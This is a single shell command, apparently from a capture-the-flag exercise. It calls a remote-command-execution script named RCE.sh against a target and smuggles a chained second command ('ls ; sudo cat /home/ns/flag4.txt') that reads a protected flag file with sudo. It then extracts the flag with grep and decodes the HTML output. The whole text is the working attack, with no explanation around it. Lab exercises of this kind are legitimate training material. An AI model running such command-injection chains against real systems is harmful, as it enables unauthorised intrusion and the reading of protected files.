./RCE.sh $1 "ls ; sudo cat  /home/ns/flag4.txt" $2 | grep -o 'flag4{.*}' | recode html
